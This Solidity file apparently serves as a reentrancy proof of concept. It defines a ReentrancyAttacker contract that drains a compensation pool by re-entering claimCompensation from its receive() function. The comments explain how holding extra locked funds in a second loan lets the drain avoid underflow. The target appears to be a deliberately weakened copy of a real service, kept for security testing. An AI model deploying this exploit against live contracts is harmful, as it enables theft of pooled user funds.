// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnService {
    function deposit() external payable;
    function vote(uint256 proposalId, bool approve) external;
    function claimCompensation(address payable loan) external;
}

/// @title ReentrancyAttacker
/// @notice Malicious contributor that drains the compensation pool of the
/// FAITHFUL vulnerable service (your real claimCompensation with only the
/// external call moved before the effects).
///
/// Because the vulnerable function keeps the full per-account bookkeeping
/// (locked/deposited decremented by `give` in EACH reentrant frame), the
/// attacker must hold enough locked/deposited to survive those repeated
/// subtractions without underflow. It arranges this by ALSO being locked into
/// a second, still-active loan — so locked[attacker] and deposited[attacker]
/// exceed the total it will drain.
contract ReentrancyAttacker {
    IVulnService public immutable service;
    address payable public target;
    uint256 public reentriesLeft;

    constructor(address _service) {
        service = IVulnService(_service);
    }

    function depositToPool() external payable {
        service.deposit{value: msg.value}();
    }

    function vote(uint256 proposalId, bool approve) external {
        service.vote(proposalId, approve);
    }

    function attack(address payable loan, uint256 reentries) external {
        target = loan;
        reentriesLeft = reentries;
        service.claimCompensation(loan); // first claim -> receive() re-enters
    }

    receive() external payable {
        if (reentriesLeft > 0) {
            reentriesLeft--;
            service.claimCompensation(target);
        }
    }
}
